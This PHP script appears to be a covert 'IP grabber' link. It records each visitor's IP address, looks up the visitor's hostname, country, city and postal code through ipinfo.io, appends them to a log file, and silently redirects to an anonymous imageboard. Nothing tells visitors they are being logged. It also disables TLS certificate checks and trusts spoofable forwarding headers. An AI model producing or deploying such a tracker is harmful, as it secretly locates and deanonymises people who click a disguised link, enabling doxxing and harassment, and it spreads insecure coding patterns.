<?php
    
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }   
    
    $ip_data = curlRequest('http://ipinfo.io/'.$ip.'/json', 'GET');
    $file = fopen("trackerLog.txt", "a+");
    fwrite($file,'IP Hostname ### ' . $ip_data['hostname'] . PHP_EOL);
    fwrite($file,'IP Country ### ' . $ip_data['country'] . PHP_EOL);
    fwrite($file,'IP City ### ' . $ip_data['city'] . PHP_EOL);
    fwrite($file,'IP Postal ### ' . $ip_data['postal'] . PHP_EOL);
    fwrite($file,'IP Address ### ' . $ip . PHP_EOL . PHP_EOL);
    fclose($file);

    header("location: http://www.anon-ib.com");
   

    function curlRequest($url, $method, $data = null, $access_token = '')
    {
        $handle = curl_init();
        curl_setopt($handle, CURLOPT_URL, $url);
        if ($access_token != '') {
            # headers and data (this is API dependent, some uses XML)
            if ($method == 'PUT') {
            $headers = array(
                            'Accept: application/json',
                            'Content-Type: application/json',
                            'Content-Type: multipart/form-data',
                            'Authorization: '.$access_token,
                            );
            } else {
                $headers = array(
                            'Authorization: '.$access_token
                            );
            }
            curl_setopt($handle, CURLOPT_HTTPHEADER, $headers);
        } 
        curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($handle, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($handle, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($handle, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
        
        switch($method) {
            case 'GET':
            break;
            case 'POST':
            curl_setopt($handle, CURLOPT_POST, true);
            curl_setopt($handle, CURLOPT_POSTFIELDS, $data);
            break;
            case 'PUT':
            curl_setopt($handle, CURLOPT_CUSTOMREQUEST, 'PUT');
            curl_setopt($handle, CURLOPT_POSTFIELDS, $data);
            break;
            case 'DELETE':
            curl_setopt($handle, CURLOPT_CUSTOMREQUEST, 'DELETE');
            break;
        }
        $response = curl_exec($handle);
        $response = json_decode($response, true);
        return $response; 
    }

?>